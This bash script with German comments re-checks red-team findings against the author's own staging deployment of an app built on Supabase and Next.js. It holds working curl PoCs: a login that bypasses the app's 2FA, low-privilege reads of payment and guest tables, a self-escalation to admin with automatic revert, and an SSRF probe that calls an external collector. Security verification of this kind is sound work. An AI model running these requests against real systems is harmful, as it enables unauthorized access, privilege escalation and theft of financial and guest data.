#!/usr/bin/env bash
# ============================================================================
# redteam-verify.sh — Live-Verifikation der Red-Team-Befunde gegen STAGING
# ----------------------------------------------------------------------------
# Nur gegen EUER EIGENES Staging laufen lassen. Read-only by default.
# Destruktive PoCs (Rollen-Eskalation, DoS) sind hinter DESTRUCTIVE=1 gated
# und machen ihre Änderung sofort rückgängig bzw. sind bewusst NICHT enthalten.
#
# Voraussetzungen (als ENV setzen, NICHT ins Repo committen):
#   export SUPABASE_URL="https://staging-supabase.example"      # PostgREST/GoTrue Basis
#   export ANON_KEY="eyJ...."                                   # öffentlicher anon/publishable key
#   export WEB_BASE="https://staging.example"                   # Next.js (apps/web)
#   export API_BASE="https://staging-api.example"               # FastAPI /api/v1
#   export LOWPRIV_EMAIL="cleaner@dein-testtenant.tld"          # ein echtes Low-Priv-Testkonto (staff/cleaner)
#   export LOWPRIV_PASS="..."                                   # dessen Passwort
#   export SSRF_CALLBACK="https://webhook.site/DEINE-UUID"      # eigener Collector für FE-1 (optional)
#
# Aufruf:   bash scripts/security/redteam-verify.sh
# Destruktiv (SB-2 Rollen-PATCH mit Auto-Revert): DESTRUCTIVE=1 bash scripts/security/redteam-verify.sh
# ============================================================================
set -uo pipefail

need() { [ -n "${!1:-}" ] || { echo "FEHLT ENV: $1"; exit 1; }; }
need SUPABASE_URL; need ANON_KEY; need LOWPRIV_EMAIL; need LOWPRIV_PASS
: "${WEB_BASE:=}"; : "${API_BASE:=}"; : "${SSRF_CALLBACK:=}"

hr(){ printf '\n\033[1m== %s ==\033[0m\n' "$1"; }
ok(){ printf '  \033[32m%s\033[0m\n' "$*"; }
bad(){ printf '  \033[31m%s\033[0m\n' "$*"; }
note(){ printf '  %s\n' "$*"; }

# ---------------------------------------------------------------------------
# 0) Low-Priv-JWT DIREKT bei GoTrue holen (belegt zugleich AT-3: am App-Limit vorbei)
# ---------------------------------------------------------------------------
hr "0) Direkter GoTrue-Login (umgeht FastAPI /auth/login + App-2FA -> AT-1/AT-3)"
LOGIN=$(curl -s -X POST "$SUPABASE_URL/auth/v1/token?grant_type=password" \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d "{\"email\":\"$LOWPRIV_EMAIL\",\"password\":\"$LOWPRIV_PASS\"}")
JWT=$(printf '%s' "$LOGIN" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
UID=$(printf '%s' "$LOGIN" | sed -n 's/.*"sub":"\([^"]*\)".*/\1/p')  # ggf. leer -> unten aus /rest ableiten
if [ -n "$JWT" ]; then
  bad "AT-1/AT-3 BESTÄTIGT: direkter Passwort-Login bei GoTrue liefert ein gültiges JWT (2FA/App-Ratelimit umgangen)."
else
  ok "Kein direktes JWT erhalten (Login blockiert / MFA am GoTrue erzwungen)."
  echo "$LOGIN" | head -c 300; echo; exit 0
fi
AUTH=(-H "apikey: $ANON_KEY" -H "Authorization: Bearer $JWT")

# ---------------------------------------------------------------------------
# 1) SB-1 (READ-ONLY): sensible Tabellen direkt über PostgREST lesen
# ---------------------------------------------------------------------------
hr "1) SB-1 READ: Finanz-/Gastdaten direkt via PostgREST (Rollen-Split nur im API?)"
for T in payments commissions guests owner_statements; do
  CODE=$(curl -s -o /tmp/rt_$T.json -w '%{http_code}' "${AUTH[@]}" \
    "$SUPABASE_URL/rest/v1/$T?select=*&limit=3")
  N=$(grep -o '{' /tmp/rt_$T.json 2>/dev/null | wc -l | tr -d ' ')
  if [ "$CODE" = "200" ] && [ "${N:-0}" -gt 0 ]; then
    bad "  $T: HTTP 200, $N Objekt(e) sichtbar  -> SB-1 BESTÄTIGT (Low-Priv liest $T direkt)."
  else
    ok  "  $T: HTTP $CODE, keine Daten -> geschützt."
  fi
done

# ---------------------------------------------------------------------------
# 2) SB-2 (DESTRUKTIV, gated): eigene users.role -> admin, mit SOFORTIGEM Revert
# ---------------------------------------------------------------------------
hr "2) SB-2 WRITE: Self-Escalation users.role=admin (nur mit DESTRUCTIVE=1)"
[ -z "$UID" ] && UID=$(curl -s "${AUTH[@]}" "$SUPABASE_URL/rest/v1/users?select=id&limit=1" | sed -n 's/.*"id":"\([^"]*\)".*/\1/p')
if [ "${DESTRUCTIVE:-0}" = "1" ] && [ -n "$UID" ]; then
  ORIG=$(curl -s "${AUTH[@]}" "$SUPABASE_URL/rest/v1/users?id=eq.$UID&select=role" | sed -n 's/.*"role":"\([^"]*\)".*/\1/p')
  note "  Ausgangsrolle: ${ORIG:-?}  (wird nach dem Test zurückgesetzt)"
  RESP=$(curl -s -w '\n%{http_code}' -X PATCH "$SUPABASE_URL/rest/v1/users?id=eq.$UID" \
    "${AUTH[@]}" -H "Content-Type: application/json" -H "Prefer: return=representation" \
    -d '{"role":"admin"}')
  BODY=$(printf '%s' "$RESP" | head -n -1); CODE=$(printf '%s' "$RESP" | tail -n1)
  if echo "$BODY" | grep -q '"role":"admin"'; then
    bad "  SB-2 BESTÄTIGT: PATCH auf role=admin akzeptiert (HTTP $CODE) -> DB-seitige Privilege-Escalation!"
  else
    ok  "  Write abgelehnt (HTTP $CODE) -> users-Schreibpfad geschützt."
  fi
  # REVERT
  if [ -n "$ORIG" ]; then
    curl -s -o /dev/null -X PATCH "$SUPABASE_URL/rest/v1/users?id=eq.$UID" \
      "${AUTH[@]}" -H "Content-Type: application/json" -d "{\"role\":\"$ORIG\"}"
    note "  Revert auf '$ORIG' ausgeführt. BITTE in der DB gegenprüfen!"
  fi
else
  note "  Übersprungen (read-only). Zum Ausführen: DESTRUCTIVE=1 ... (setzt Rolle kurz auf admin, dann zurück)."
fi

# ---------------------------------------------------------------------------
# 3) FE-1 (READ-ONLY-Probe): unauth SSRF via generate-pdf-single
# ---------------------------------------------------------------------------
hr "3) FE-1: unauth. PDF-Render (SSRF) — OHNE Auth-Header"
if [ -n "$WEB_BASE" ] && [ -n "$SSRF_CALLBACK" ]; then
  CODE=$(curl -s -o /tmp/rt_pdf.bin -w '%{http_code}' -X POST "$WEB_BASE/api/v1/generate-pdf-single" \
    -H "Content-Type: application/json" \
    -d "{\"htmlContent\":\"<img src='$SSRF_CALLBACK/fe1-probe'>\"}")
  if [ "$CODE" = "200" ]; then
    bad "  FE-1 WAHRSCHEINLICH BESTÄTIGT: HTTP 200 OHNE Auth. Prüfe deinen Collector ($SSRF_CALLBACK) auf den /fe1-probe-Hit (= serverseitiger Fetch/SSRF)."
  else
    ok  "  HTTP $CODE (Auth verlangt / Route geschützt)."
  fi
else
  note "  Übersprungen (WEB_BASE und SSRF_CALLBACK setzen)."
fi

# ---------------------------------------------------------------------------
# 4) A8 (READ-ONLY): /docs & /openapi.json in Staging offen?
# ---------------------------------------------------------------------------
hr "4) Info-Disclosure: /docs, /openapi.json"
if [ -n "$API_BASE" ]; then
  for P in /docs /openapi.json /redoc; do
    C=$(curl -s -o /dev/null -w '%{http_code}' "$API_BASE$P")
    [ "$C" = "200" ] && bad "  $P offen (HTTP 200)" || ok "  $P -> HTTP $C"
  done
else
  note "  Übersprungen (API_BASE setzen)."
fi

# ---------------------------------------------------------------------------
# 5) NICHT enthalten: DoS (Q-1 Span / OTA-1 iCal) — würde Staging belasten.
# ---------------------------------------------------------------------------
hr "5) DoS-PoCs (Q-1 / OTA-1) bewusst NICHT automatisiert"
note "  Manuell & bounded testen: 1 Request GET \$API_BASE/booking-engine/availability?start=2027-01-01&end=2029-01-01"
note "  und Antwortzeit/Speicher beobachten. NICHT mit 9999-Jahres-Span gegen Staging feuern."

hr "Fertig"
note "Rot markierte Zeilen = bestätigte Lücke. Ergebnisse in docs/SECURITY-REDTEAM.md eintragen."
